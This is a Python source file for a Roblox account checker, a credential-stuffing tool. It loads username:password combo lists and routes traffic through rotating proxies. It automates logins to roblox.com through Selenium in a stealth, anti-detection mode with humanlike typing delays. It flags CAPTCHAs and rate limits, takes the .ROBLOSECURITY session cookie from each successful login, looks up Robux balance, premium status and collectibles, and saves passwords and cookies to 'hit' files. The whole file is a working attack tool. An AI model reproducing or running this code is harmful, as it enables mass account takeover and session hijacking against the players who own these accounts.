# checker.py - Complete fixed version with proper web support
import os
import sys
import json
import time
import random
import threading
import queue
import logging
import subprocess
import re
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any
from enum import Enum
from dataclasses import dataclass, field

# Import dependencies
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.common.exceptions import (
        TimeoutException, NoSuchElementException,
        WebDriverException, ElementNotInteractableException,
        ElementClickInterceptedException, StaleElementReferenceException,
        InvalidSessionIdException, NoSuchWindowException
    )
    import undetected_chromedriver as uc
    from webdriver_manager.chrome import ChromeDriverManager
    import requests
except ImportError as e:
    print(f"[-] Missing dependency: {e}")
    print("[!] Please install: pip install -r requirements.txt")
    raise


@dataclass
class Account:
    username: str
    password: str
    status: str = "unchecked"
    robux: int = 0
    premium: bool = False
    friends: int = 0
    cookies: Optional[Dict] = None
    proxy_used: Optional[str] = None
    verification_time: float = 0.0
    message: str = ""
    user_id: str = ""
    display_name: str = ""
    profile_url: str = ""
    avatar_url: str = ""
    description: str = ""
    account_age: str = ""
    join_date: str = ""
    followers: int = 0
    following: int = 0
    badges: int = 0
    groups: List[Dict] = field(default_factory=list)
    groups_count: int = 0
    top_groups: str = ""
    collectibles: int = 0
    wearing_items: List[str] = field(default_factory=list)
    account_banned: bool = False


class VerificationMode(Enum):
    NORMAL = "normal"
    HEADLESS = "headless"
    STEALTH = "stealth"
    RAPID = "rapid"


class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.active_proxies = []
        self.failed_proxies = []
        self.last_use = {}
        self.success_count = {}
        self.fail_count = {}
    
    def load_proxies(self, file_path: str):
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        self.proxies.append(line)
            print(f"[+] {len(self.proxies)} proxies loaded")
            self.active_proxies = self.proxies.copy()
            return True
        except Exception as e:
            print(f"[-] Error loading proxies: {e}")
            return False
    
    def get_proxy(self):
        if not self.active_proxies:
            return None
        return random.choice(self.active_proxies) if self.active_proxies else None
    
    def report_success(self, proxy: str):
        pass
    
    def report_failure(self, proxy: str):
        pass


class DriverManager:
    def __init__(self):
        self.active_drivers = {}
        self.usage_count = {}
        self.max_uses_per_driver = 30
        self.driver_path = None
        self.setup_driver_path()
    
    def setup_driver_path(self):
        try:
            from webdriver_manager.chrome import ChromeDriverManager
            from selenium.webdriver.chrome.service import Service
            
            print("[+] Setting up ChromeDriver...")
            self.driver_path = ChromeDriverManager().install()
            print(f"[+] ChromeDriver ready: {self.driver_path}")
            return True
        except Exception as e:
            print(f"[-] Webdriver-manager failed: {e}")
            print("[!] Trying manual paths...")
            
            common_paths = [
                r"C:\chromedriver\chromedriver.exe",
                r"C:\Windows\System32\chromedriver.exe",
                os.path.join(os.getcwd(), "chromedriver.exe"),
                os.path.join(os.path.expanduser("~"), "chromedriver.exe"),
                "/usr/local/bin/chromedriver",
                "/usr/bin/chromedriver"
            ]
            
            for path in common_paths:
                if os.path.exists(path):
                    self.driver_path = path
                    print(f"[+] Found ChromeDriver at: {self.driver_path}")
                    return True
            
            print("[-] ChromeDriver not found!")
            return False
    
    def create_driver(self, mode: VerificationMode, proxy: str = None, worker_id: int = 0):
        try:
            from selenium.webdriver.chrome.service import Service
            
            options = Options()
            
            base_args = [
                "--disable-blink-features=AutomationControlled",
                "--disable-dev-shm-usage",
                "--no-sandbox",
                "--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "--log-level=3",
            ]
            
            if mode == VerificationMode.HEADLESS:
                base_args.append("--headless=new")
                base_args.append("--disable-gpu")
                base_args.append("--window-size=1920,1080")
                base_args.append("--disable-software-rasterizer")
                base_args.append("--disable-setuid-sandbox")
            elif mode == VerificationMode.STEALTH:
                base_args.extend([
                    "--disable-web-security",
                    "--allow-running-insecure-content",
                    "--disable-features=IsolateOrigins,site-per-process",
                ])
                options.add_experimental_option("excludeSwitches", ["enable-automation"])
                options.add_experimental_option('useAutomationExtension', False)
            
            for arg in base_args:
                options.add_argument(arg)
            
            if proxy:
                options.add_argument(f'--proxy-server={proxy}')
            
            prefs = {
                "credentials_enable_service": False,
                "profile.password_manager_enabled": False,
                "profile.default_content_setting_values.notifications": 2,
                "intl.accept_languages": "en-US,en",
            }
            options.add_experimental_option("prefs", prefs)
            
            if self.driver_path and os.path.exists(self.driver_path):
                service = Service(executable_path=self.driver_path)
                
                if mode == VerificationMode.STEALTH:
                    driver = uc.Chrome(service=service, options=options)
                else:
                    driver = webdriver.Chrome(service=service, options=options)
            else:
                print("[!] No driver path found, trying default...")
                if mode == VerificationMode.STEALTH:
                    driver = uc.Chrome(options=options)
                else:
                    driver = webdriver.Chrome(options=options)
            
            timeout = 10 if mode == VerificationMode.RAPID else 20
            driver.set_page_load_timeout(timeout)
            driver.set_script_timeout(timeout)
            
            driver_id = f"worker_{worker_id}"
            self.active_drivers[driver_id] = driver
            self.usage_count[driver_id] = 1
            
            return driver
            
        except Exception as e:
            print(f"[-] Error creating driver: {e}")
            return None
    
    def cleanup_drivers(self):
        for driver_id, driver in self.active_drivers.items():
            try:
                driver.quit()
            except:
                pass
        
        self.active_drivers.clear()
        self.usage_count.clear()


class RobloxAPILookup:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def parse_date(self, date_str):
        if not date_str:
            return "Unknown Date"
        formats = ["%Y-%m-%dT%H:%M:%S.%fZ", "%Y-%m-%dT%H:%M:%SZ"]
        for fmt in formats:
            try:
                return datetime.strptime(date_str, fmt).strftime("%Y-%m-%d %H:%M:%S")
            except ValueError:
                continue
        return "Unknown Date"
    
    def calculate_account_age(self, created_date):
        try:
            if created_date == "Unknown Date":
                return "Unknown"
            
            for fmt in ["%Y-%m-%d %H:%M:%S", "%Y-%m-%d"]:
                try:
                    join_date = datetime.strptime(created_date, fmt)
                    break
                except ValueError:
                    continue
            else:
                return "Unknown"
            
            current_date = datetime.now()
            days = (current_date - join_date).days
            years = days // 365
            months = (days % 365) // 30
            remaining_days = (days % 365) % 30
            
            age_parts = []
            if years > 0:
                age_parts.append(f"{years}y")
            if months > 0:
                age_parts.append(f"{months}m")
            if remaining_days > 0 or (years == 0 and months == 0):
                age_parts.append(f"{remaining_days}d")
            
            return f"{' '.join(age_parts)} ({days} days)"
        except:
            return "Unknown"
    
    def get_user_id(self, username):
        try:
            url = "https://users.roblox.com/v1/usernames/users"
            payload = {"usernames": [username], "excludeBannedUsers": False}
            response = self.session.post(url, json=payload, timeout=10)
            response.raise_for_status()
            data = response.json().get("data", [])
            if data and len(data) > 0:
                return data[0].get("id")
            return None
        except Exception:
            return None
    
    def get_user_info(self, user_id):
        try:
            response = self.session.get(f"https://users.roblox.com/v1/users/{user_id}", timeout=10)
            response.raise_for_status()
            return response.json()
        except Exception:
            return None
    
    def get_robux_balance(self, user_id, cookie):
        try:
            url = f"https://economy.roblox.com/v1/users/{user_id}/currency"
            headers = {'Cookie': f'.ROBLOSECURITY={cookie}'}
            response = self.session.get(url, headers=headers, timeout=10)
            if response.status_code == 200:
                return response.json().get("robux", 0)
            return 0
        except Exception:
            return 0
    
    def check_premium_status(self, user_id, cookie):
        try:
            url = "https://premiumfeatures.roblox.com/v1/user/premium"
            headers = {'Cookie': f'.ROBLOSECURITY={cookie}'}
            response = self.session.get(url, headers=headers, timeout=10)
            if response.status_code == 200:
                data = response.json()
                return data.get("isPremium", False)
            return False
        except Exception:
            return False
    
    def get_friend_count(self, user_id):
        try:
            response = self.session.get(f"https://friends.roblox.com/v1/users/{user_id}/friends/count", timeout=10)
            return response.json().get("count", 0)
        except:
            return 0
    
    def get_follower_count(self, user_id):
        try:
            response = self.session.get(f"https://friends.roblox.com/v1/users/{user_id}/followers/count", timeout=10)
            return response.json().get("count", 0)
        except:
            return 0
    
    def get_following_count(self, user_id):
        try:
            response = self.session.get(f"https://friends.roblox.com/v1/users/{user_id}/followings/count", timeout=10)
            return response.json().get("count", 0)
        except:
            return 0
    
    def get_badge_count(self, user_id):
        try:
            response = self.session.get(f"https://badges.roblox.com/v1/users/{user_id}/badges?limit=100", timeout=10)
            data = response.json()
            return len(data.get("data", []))
        except:
            return 0
    
    def get_groups_info(self, user_id):
        try:
            response = self.session.get(f"https://groups.roblox.com/v1/users/{user_id}/groups/roles", timeout=10)
            data = response.json()
            groups_data = data.get("data", [])
            
            groups_list = []
            top_groups = []
            
            for group in groups_data[:3]:
                group_data = group.get('group', {})
                group_name = group_data.get('name', 'Unknown')
                role_data = group.get('role', {})
                group_role = role_data.get('name', 'Member')
                group_id = group_data.get('id', '')
                top_groups.append(f"{group_name} ({group_role})")
                groups_list.append({
                    'name': group_name,
                    'role': group_role,
                    'id': group_id
                })
            
            groups_display = ", ".join(top_groups) if top_groups else "None"
            if len(groups_data) > 3:
                groups_display += f" and {len(groups_data) - 3} more..."
            
            return {
                'count': len(groups_data),
                'top_groups': groups_display,
                'groups_list': groups_list
            }
        except:
            return {'count': 0, 'top_groups': 'None', 'groups_list': []}
    
    def get_collectibles_count(self, user_id):
        try:
            response = self.session.get(f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?limit=1", timeout=10)
            return response.json().get("total", 0)
        except:
            return 0
    
    def get_avatar_url(self, user_id):
        try:
            response = self.session.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=420x420&format=Png&isCircular=false", timeout=10)
            data = response.json()
            if data.get("data") and len(data["data"]) > 0:
                return data["data"][0].get("imageUrl", "N/A")
            return "N/A"
        except:
            return "N/A"
    
    def get_wearing_items(self, user_id):
        try:
            response = self.session.get(
                f'https://avatar.roblox.com/v1/users/{user_id}/avatar',
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                item_names = []
                
                if 'assets' in data:
                    for asset in data.get('assets', []):
                        asset_id = asset.get('id')
                        if asset_id:
                            item_name = self.get_item_name_fast(asset_id)
                            if item_name:
                                item_names.append(item_name)
                            else:
                                item_names.append(f"Item_{asset_id}")
                
                return item_names
            
            return []
        except Exception:
            return []
    
    def get_item_name_fast(self, asset_id):
        try:
            response = self.session.get(
                f'https://catalog.roblox.com/v1/assets/{asset_id}/details',
                timeout=5
            )
            
            if response.status_code == 200:
                data = response.json()
                return data.get('Name', f'Item_{asset_id}')
            
            response = self.session.get(
                f'https://economy.roblox.com/v2/assets/{asset_id}/details',
                timeout=5
            )
            
            if response.status_code == 200:
                data = response.json()
                return data.get('Name', f'Item_{asset_id}')
                
            return None
        except Exception:
            return None
    
    def get_full_account_info(self, username: str, cookie: str = None, user_id: str = None) -> Optional[Dict]:
        try:
            if not user_id:
                user_id = self.get_user_id(username)
                if not user_id:
                    return None
            
            profile = self.get_user_info(user_id)
            if not profile:
                return None
            
            friends = self.get_friend_count(user_id)
            followers = self.get_follower_count(user_id)
            following = self.get_following_count(user_id)
            badges = self.get_badge_count(user_id)
            groups_info = self.get_groups_info(user_id)
            collectibles = self.get_collectibles_count(user_id)
            avatar_url = self.get_avatar_url(user_id)
            wearing_items = self.get_wearing_items(user_id)
            
            robux = 0
            premium = False
            if cookie:
                robux = self.get_robux_balance(user_id, cookie)
                premium = self.check_premium_status(user_id, cookie)
            
            join_date = self.parse_date(profile.get("created"))
            
            description = profile.get("description", "N/A")
            if description != "N/A" and len(description) > 100:
                description = description[:100] + "..."
            
            return {
                "user_id": str(user_id),
                "display_name": profile.get("displayName", "N/A"),
                "profile_url": f"https://www.roblox.com/users/{user_id}/profile",
                "avatar_url": avatar_url,
                "description": description,
                "account_banned": profile.get("isBanned", False),
                "join_date": join_date,
                "account_age": self.calculate_account_age(join_date),
                "friends": friends,
                "followers": followers,
                "following": following,
                "badges": badges,
                "groups_count": groups_info['count'],
                "top_groups": groups_info['top_groups'],
                "groups_list": groups_info['groups_list'],
                "collectibles": collectibles,
                "wearing_items": wearing_items,
                "wearing_items_count": len(wearing_items),
                "robux": robux,
                "premium": premium
            }
        except Exception:
            return None


class AntraxRblxChecker:
    def __init__(self):
        self.accounts: List[Account] = []
        self.proxy_manager = ProxyManager()
        self.driver_manager = DriverManager()
        self.api_lookup = RobloxAPILookup()
        
        # DEFAULT: NORMAL mode (same as reblox.py)
        self.mode = VerificationMode.NORMAL
        self.min_delay = 5.0
        self.max_delay = 10.0
        self.max_workers = 2
        self.max_accounts_per_test = 999999
        
        self.running = True
        self.paused = False
        self.lock = threading.Lock()
        
        self.recent_results = []
        self.web_results = []
        
        self.stats = {
            'total': 0,
            'verified': 0,
            'valid': 0,
            'wrong_password': 0,
            'captcha': 0,
            'rate_limit': 0,
            'timeout': 0,
            'blocked': 0,
            'driver_error': 0,
            'other_errors': 0,
            'start_time': time.time(),
            'premium_accounts': 0,
            'total_robux': 0
        }
    
    def load_accounts(self, file_path: str):
        try:
            loaded_accounts = 0
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if ':' in line:
                        parts = line.split(':', 1)
                        if len(parts) == 2:
                            username, password = parts
                            if username and password:
                                self.accounts.append(Account(
                                    username=username.strip(),
                                    password=password.strip()
                                ))
                                loaded_accounts += 1
            
            self.stats['total'] = len(self.accounts)
            print(f"\n[+] {loaded_accounts} accounts loaded")
            if self.accounts:
                print(f"[*] First account: {self.accounts[0].username}")
            return True
            
        except Exception as e:
            print(f"[-] Error loading accounts: {e}")
            return False
    
    def load_proxies(self, file_path: str):
        return self.proxy_manager.load_proxies(file_path)
    
    def check_execution(self):
        with self.lock:
            if not self.running:
                return False
            while self.paused and self.running:
                time.sleep(0.5)
            return self.running
    
    def get_cookie_from_driver(self, driver) -> Optional[str]:
        try:
            cookies = driver.get_cookies()
            for cookie in cookies:
                if cookie.get('name') == '.ROBLOSECURITY':
                    return cookie.get('value')
            return None
        except (InvalidSessionIdException, NoSuchWindowException):
            return None
        except Exception:
            return None
    
    def safe_find_element(self, driver, selector: str, by=By.ID, timeout=5):
        try:
            element = WebDriverWait(driver, timeout).until(
                EC.presence_of_element_located((by, selector))
            )
            return element
        except (TimeoutException, StaleElementReferenceException, NoSuchElementException):
            return None
    
    def process_valid_account(self, driver, account: Account):
        try:
            cookie = self.get_cookie_from_driver(driver)
            
            user_id = self.api_lookup.get_user_id(account.username)
            account.user_id = user_id if user_id else ""
            
            lookup_info = self.api_lookup.get_full_account_info(account.username, cookie, user_id)
            if lookup_info:
                account.user_id = lookup_info.get('user_id', '')
                account.display_name = lookup_info.get('display_name', '')
                account.profile_url = lookup_info.get('profile_url', '')
                account.avatar_url = lookup_info.get('avatar_url', '')
                account.description = lookup_info.get('description', '')
                account.account_age = lookup_info.get('account_age', '')
                account.join_date = lookup_info.get('join_date', '')
                account.friends = lookup_info.get('friends', 0)
                account.followers = lookup_info.get('followers', 0)
                account.following = lookup_info.get('following', 0)
                account.badges = lookup_info.get('badges', 0)
                account.groups_count = lookup_info.get('groups_count', 0)
                account.top_groups = lookup_info.get('top_groups', '')
                account.groups = lookup_info.get('groups_list', [])
                account.collectibles = lookup_info.get('collectibles', 0)
                account.wearing_items = lookup_info.get('wearing_items', [])
                account.account_banned = lookup_info.get('account_banned', False)
                account.robux = lookup_info.get('robux', 0)
                account.premium = lookup_info.get('premium', False)
            
            if cookie:
                account.cookies = {'.ROBLOSECURITY': cookie}
            
            if account.premium:
                self.stats['premium_accounts'] += 1
            
            if account.robux > 0:
                self.stats['total_robux'] += account.robux
            
            self.save_hit(account)
            
        except Exception as e:
            print(f"[-] Error processing valid account: {e}")
    
    def save_hit(self, account: Account):
        try:
            with open('valid_result.txt', 'a', encoding='utf-8') as f:
                f.write("=" * 80 + "\n")
                f.write(f"USERNAME: {account.username}\n")
                f.write(f"PASSWORD: {account.password}\n")
                f.write(f"USER ID: {account.user_id}\n")
                f.write(f"DISPLAY NAME: {account.display_name}\n")
                f.write(f"PROFILE URL: {account.profile_url}\n")
                f.write(f"AVATAR URL: {account.avatar_url}\n")
                f.write(f"ACCOUNT STATUS: {'BANNED' if account.account_banned else 'ACTIVE'}\n")
                f.write(f"PREMIUM: {'YES' if account.premium else 'NO'}\n")
                f.write(f"ROBUX: {account.robux:,}\n")
                f.write(f"ACCOUNT AGE: {account.account_age}\n")
                f.write(f"JOIN DATE: {account.join_date}\n")
                f.write(f"FRIENDS: {account.friends}\n")
                f.write(f"FOLLOWERS: {account.followers}\n")
                f.write(f"FOLLOWING: {account.following}\n")
                f.write(f"BADGES: {account.badges}\n")
                f.write(f"GROUPS: {account.groups_count}\n")
                f.write(f"TOP GROUPS: {account.top_groups}\n")
                f.write(f"COLLECTIBLES: {account.collectibles}\n")
                f.write(f"DESCRIPTION: {account.description}\n")
                f.write("\n--- WEARING ITEMS ---\n")
                if account.wearing_items:
                    for i, item in enumerate(account.wearing_items[:20], 1):
                        f.write(f"  {i}. {item}\n")
                    if len(account.wearing_items) > 20:
                        f.write(f"  ... and {len(account.wearing_items) - 20} more items\n")
                else:
                    f.write("  No items currently wearing\n")
                f.write("=" * 80 + "\n\n")
            
            if account.cookies and '.ROBLOSECURITY' in account.cookies:
                with open('cookie_result.txt', 'a', encoding='utf-8') as f:
                    cookie_value = account.cookies['.ROBLOSECURITY']
                    premium_flag = "PREMIUM" if account.premium else "NORMAL"
                    f.write(f"{account.username}:{account.password}|{cookie_value}|{account.robux}|{premium_flag}\n")
            
            self.stats['valid'] += 1
            
            premium_tag = " [PREMIUM]" if account.premium else ""
            robux_tag = f" | R${account.robux:,}" if account.robux > 0 else ""
            self.recent_results.append(('HIT', account.username, f"{robux_tag}{premium_tag}", account.status))
            
        except Exception as e:
            print(f"[-] Error saving hit: {e}")
    
    def verify_account(self, account: Account, worker_id: int = 0) -> Account:
        driver = None
        proxy = None
        start_time = time.time()
        
        if not self.check_execution():
            account.status = "cancelled"
            account.message = "Cancelled by user"
            return account
        
        try:
            proxy = self.proxy_manager.get_proxy()
            driver = self.driver_manager.create_driver(self.mode, proxy, worker_id)
            if not driver:
                account.status = "driver_error"
                account.message = "Failed to create driver"
                return account
            
            time.sleep(random.uniform(1, 2))
            
            try:
                driver.get("https://www.roblox.com/login")
                WebDriverWait(driver, 15).until(
                    EC.presence_of_element_located((By.ID, "login-username"))
                )
            except TimeoutException:
                account.status = "timeout"
                account.message = "Login page timeout"
                return account
            
            time.sleep(random.uniform(1, 2))
            
            try:
                username_field = self.safe_find_element(driver, "login-username", By.ID, 5)
                if not username_field:
                    account.status = "element_error"
                    account.message = "Username field not found"
                    return account
                
                username_field.clear()
                time.sleep(0.2)
                
                for char in account.username:
                    username_field.send_keys(char)
                    time.sleep(random.uniform(0.03, 0.07))
                
                time.sleep(random.uniform(0.3, 0.6))
                
                password_field = self.safe_find_element(driver, "login-password", By.ID, 5)
                if not password_field:
                    account.status = "element_error"
                    account.message = "Password field not found"
                    return account
                
                for char in account.password:
                    password_field.send_keys(char)
                    time.sleep(random.uniform(0.04, 0.08))
                
                time.sleep(random.uniform(0.4, 0.7))
                
                login_button = self.safe_find_element(driver, "login-button", By.ID, 5)
                if not login_button:
                    account.status = "element_error"
                    account.message = "Login button not found"
                    return account
                
                login_button.click()
                
            except (ElementNotInteractableException, ElementClickInterceptedException) as e:
                account.status = "element_error"
                account.message = f"Interaction error: {str(e)[:30]}"
                return account
            except Exception as e:
                account.status = "element_error"
                account.message = f"Element: {str(e)[:30]}"
                return account
            
            wait_time = 0
            max_wait = 25
            
            while wait_time < max_wait and self.check_execution():
                time.sleep(1)
                wait_time += 1
                
                try:
                    current_url = driver.current_url.lower()
                    
                    if any(x in current_url for x in ["/home", "/my/profile", "/users/"]):
                        account.status = "valid"
                        account.message = "Login successful"
                        account.verification_time = time.time() - start_time
                        account.proxy_used = proxy
                        
                        if proxy:
                            self.proxy_manager.report_success(proxy)
                        
                        self.process_valid_account(driver, account)
                        return account
                    
                    error_selectors = [
                        "#login-form-error",
                        "#password-error",
                        ".alert-danger",
                        ".error-message",
                        ".error-alert",
                        ".login-error-message"
                    ]
                    
                    for selector in error_selectors:
                        try:
                            error_elements = driver.find_elements(By.CSS_SELECTOR, selector)
                            for el in error_elements:
                                try:
                                    if el.is_displayed():
                                        text = el.text.lower()
                                        if any(word in text for word in ["incorrect", "wrong", "senha incorreta", "invalid"]):
                                            account.status = "invalid_password"
                                            account.message = "Wrong password"
                                            if proxy:
                                                self.proxy_manager.report_failure(proxy)
                                            return account
                                        if any(word in text for word in ["rate limit", "too many", "try again later"]):
                                            account.status = "rate_limit"
                                            account.message = "Rate limited"
                                            return account
                                except StaleElementReferenceException:
                                    continue
                        except Exception:
                            continue
                    
                    try:
                        iframes = driver.find_elements(By.TAG_NAME, "iframe")
                        for iframe in iframes:
                            try:
                                src = iframe.get_attribute("src") or ""
                                if "recaptcha" in src or "captcha" in src:
                                    account.status = "captcha"
                                    account.message = "CAPTCHA detected"
                                    return account
                            except StaleElementReferenceException:
                                continue
                    except Exception:
                        pass
                    
                    if "login" in current_url and wait_time > 15:
                        try:
                            page_text = driver.find_element(By.TAG_NAME, "body").text.lower()
                            if "incorrect" in page_text or "wrong" in page_text:
                                account.status = "invalid_password"
                                account.message = "Wrong password"
                                return account
                            if "rate limit" in page_text:
                                account.status = "rate_limit"
                                account.message = "Rate limited"
                                return account
                        except:
                            pass
                        account.status = "timeout"
                        account.message = f"Stuck on login ({wait_time}s)"
                        return account
                    
                except Exception as e:
                    continue
            
            if account.status == "unchecked" or account.status == "checking":
                account.status = "timeout"
                account.message = "Verification timeout"
            
            return account
            
        except WebDriverException as e:
            account.status = "driver_error"
            account.message = f"WebDriver: {str(e)[:40]}"
            return account
        except Exception as e:
            account.status = "error"
            account.message = f"Error: {str(e)[:40]}"
            return account
            
        finally:
            if driver:
                try:
                    driver.quit()
                except:
                    pass
    
    def get_status_symbol(self, status: str) -> str:
        symbols = {
            'valid': '[HIT]',
            'invalid_password': '[WRONG]',
            'captcha': '[CAPTCHA]',
            'rate_limit': '[RATE]',
            'timeout': '[TIMEOUT]',
            'blocked': '[BLOCKED]',
            'driver_error': '[DRIVER]',
            'error': '[ERROR]',
            'cancelled': '[STOPPED]'
        }
        return symbols.get(status, '[?]')
    
    def update_statistics(self, status: str):
        if not self.check_execution():
            return
            
        self.stats['verified'] += 1
        
        mapping = {
            'valid': 'valid',
            'invalid_password': 'wrong_password',
            'captcha': 'captcha',
            'rate_limit': 'rate_limit',
            'timeout': 'timeout',
            'blocked': 'blocked',
            'driver_error': 'driver_error',
            'error': 'other_errors'
        }
        
        if status in mapping:
            self.stats[mapping[status]] += 1
    
    def start_verification_simple(self):
        """Simple single-threaded verification for web interface"""
        print("[DEBUG] start_verification_simple called")
        print(f"[DEBUG] Total accounts: {len(self.accounts)}")
        
        if not self.accounts:
            self.web_results = ["No accounts to verify"]
            print("[DEBUG] No accounts to verify")
            return
        
        self.running = True
        self.web_results = []
        self.recent_results = []
        
        total = len(self.accounts[:self.max_accounts_per_test])
        
        self.web_results.append("=" * 50)
        self.web_results.append("STARTING VERIFICATION")
        self.web_results.append(f"Accounts: {total}")
        self.web_results.append(f"Mode: {self.mode.value}")
        self.web_results.append("=" * 50)
        
        print(f"[DEBUG] Starting verification of {total} accounts")
        print(f"[DEBUG] Mode: {self.mode.value}")
        print(f"[DEBUG] Delay: {self.min_delay}-{self.max_delay}s")
        print("-" * 50)
        
        self.stats['start_time'] = time.time()
        
        for idx, account in enumerate(self.accounts[:self.max_accounts_per_test], 1):
            if not self.running:
                self.web_results.append("Stopped by user")
                break
            
            print(f"[DEBUG] [{idx}/{total}] Checking: {account.username}")
            self.web_results.append(f"[{idx}/{total}] Checking: {account.username}")
            
            result = self.verify_account(account, idx)
            self.stats['verified'] += 1
            
            if result.status == 'valid':
                self.stats['valid'] += 1
                if result.premium:
                    self.stats['premium_accounts'] += 1
                if result.robux > 0:
                    self.stats['total_robux'] += result.robux
                
                hit_msg = f"[HIT] {result.username} | R${result.robux}"
                if result.premium:
                    hit_msg += " [PREMIUM]"
                if result.user_id:
                    hit_msg += f" | ID: {result.user_id}"
                self.web_results.append(hit_msg)
                print(f"[DEBUG] ✅ {hit_msg}")
                
            elif result.status == 'invalid_password':
                self.stats['wrong_password'] += 1
                msg = f"[WRONG] {result.username}"
                self.web_results.append(msg)
                print(f"[DEBUG] ❌ {msg}")
                
            elif result.status == 'captcha':
                self.stats['captcha'] += 1
                msg = f"[CAPTCHA] {result.username}"
                self.web_results.append(msg)
                print(f"[DEBUG] 🤖 {msg}")
                
            elif result.status == 'timeout':
                self.stats['timeout'] += 1
                msg = f"[TIMEOUT] {result.username}"
                self.web_results.append(msg)
                print(f"[DEBUG] ⏱️ {msg}")
                
            elif result.status == 'rate_limit':
                self.stats['rate_limit'] += 1
                msg = f"[RATE] {result.username}"
                self.web_results.append(msg)
                print(f"[DEBUG] ⚠️ {msg}")
                
            elif result.status == 'blocked':
                self.stats['blocked'] += 1
                msg = f"[BLOCKED] {result.username}"
                self.web_results.append(msg)
                print(f"[DEBUG] 🚫 {msg}")
                
            elif result.status == 'driver_error':
                self.stats['driver_error'] += 1
                msg = f"[DRIVER] {result.username}"
                self.web_results.append(msg)
                print(f"[DEBUG] ⚠️ {msg}")
                
            else:
                self.stats['other_errors'] += 1
                msg = f"[ERROR] {result.username}: {result.message[:30]}"
                self.web_results.append(msg)
                print(f"[DEBUG] ❌ {msg}")
            
            if len(self.web_results) > 200:
                self.web_results = self.web_results[-200:]
            
            if idx < total and self.running:
                delay = random.uniform(self.min_delay, self.max_delay)
                print(f"[DEBUG] Waiting {delay:.1f}s before next check...")
                time.sleep(delay)
        
        summary = [
            "",
            "=" * 50,
            "VERIFICATION COMPLETE",
            "=" * 50,
            f"Total checked: {self.stats['verified']}",
            f"Valid hits: {self.stats['valid']}",
            f"Premium: {self.stats['premium_accounts']}",
            f"Total Robux: {self.stats['total_robux']:,}",
            "=" * 50
        ]
        
        for line in summary:
            self.web_results.append(line)
            print(f"[DEBUG] {line}")
        
        print("[DEBUG] start_verification_simple completed")
    
    def start_verification(self):
        """Original multi-threaded verification (for CLI use)"""
        self.start_verification_simple()


def show_banner():
    print("=" * 70)
    print("   ATX ROBLOX CHECKER")
    print("   Created by: @AntraxdevZ")
    print("=" * 70)


def get_input(prompt, default=None, input_type=str):
    while True:
        value = input(prompt)
        if not value.strip() and default is not None:
            return default
        try:
            return input_type(value.strip())
        except ValueError:
            print(f"[-] Invalid input. Please enter a valid {input_type.__name__}.")


def main():
    show_banner()
    
    print("\n" + "-" * 70)
    print("CONFIGURATION")
    print("-" * 70)
    
    while True:
        combo_file = input("\n[?] Enter combo file path (user:pass format): ").strip()
        if os.path.exists(combo_file):
            break
        print(f"[-] File not found: {combo_file}")
        print("[!] Please enter a valid file path.")
    
    max_workers = get_input("[?] How many threads? (1-10, default=2): ", default=2, input_type=int)
    if max_workers < 1:
        max_workers = 1
    if max_workers > 10:
        max_workers = 10
        print("[!] Max threads limited to 10 for stability")
    
    min_delay = get_input("[?] Minimum delay between checks (seconds, default=5): ", default=5, input_type=float)
    max_delay = get_input("[?] Maximum delay between checks (seconds, default=10): ", default=10, input_type=float)
    
    if min_delay < 1:
        min_delay = 1
    if max_delay < min_delay:
        max_delay = min_delay + 2
        print(f"[!] Adjusted max delay to {max_delay}")
    
    print("\n[?] Verification mode:")
    print("    1. Normal (Recommended - visible browser)")
    print("    2. Headless (Faster - no UI)")
    print("    3. Stealth (Anti-detection)")
    print("    4. Rapid (Less delay between actions)")
    mode_choice = get_input("    Choose (1-4, default=1): ", default=1, input_type=int)
    
    mode_map = {
        1: VerificationMode.NORMAL,
        2: VerificationMode.HEADLESS,
        3: VerificationMode.STEALTH,
        4: VerificationMode.RAPID
    }
    mode = mode_map.get(mode_choice, VerificationMode.NORMAL)
    
    use_proxy = get_input("\n[?] Use proxies? (y/n, default=n): ", default='n')
    proxies_file = None
    if use_proxy.lower() == 'y':
        while True:
            proxies_file = input("[?] Enter proxy file path: ").strip()
            if os.path.exists(proxies_file):
                break
            print(f"[-] File not found: {proxies_file}")
            print("[!] Press Enter to skip proxies, or enter valid path.")
            if not proxies_file:
                proxies_file = None
                break
    
    account_limit = get_input("\n[?] Max accounts to check (0=all, default=0): ", default=0, input_type=int)
    if account_limit == 0:
        account_limit = 999999
    
    print("\n" + "-" * 70)
    print("CONFIGURATION SUMMARY")
    print("-" * 70)
    print(f"Combo file:      {combo_file}")
    print(f"Threads:         {max_workers}")
    print(f"Delay:           {min_delay}-{max_delay} seconds")
    print(f"Mode:            {mode.value}")
    print(f"Proxies:         {proxies_file if proxies_file else 'None'}")
    print(f"Account limit:   {'All' if account_limit >= 999999 else account_limit}")
    print("-" * 70)
    
    confirm = get_input("\n[?] Start verification? (y/n, default=y): ", default='y')
    if confirm.lower() != 'y':
        print("[!] Cancelled.")
        sys.exit(0)
    
    checker = AntraxRblxChecker()
    
    checker.mode = mode
    checker.min_delay = min_delay
    checker.max_delay = max_delay
    checker.max_workers = max_workers
    checker.max_accounts_per_test = account_limit
    
    if not checker.load_accounts(combo_file):
        print("[-] Failed to load accounts. Exiting.")
        sys.exit(1)
    
    if proxies_file:
        checker.load_proxies(proxies_file)
    
    try:
        checker.start_verification()
    except KeyboardInterrupt:
        print("\n[!] Stopped by user")
        checker.running = False
    
    print("\n[+] Done! Check output files:")
    print("    - valid_result.txt (Complete account information)")
    print("    - cookie_result.txt (Username:Pass|Cookie|Robux|Premium)")


if __name__ == "__main__":
    main()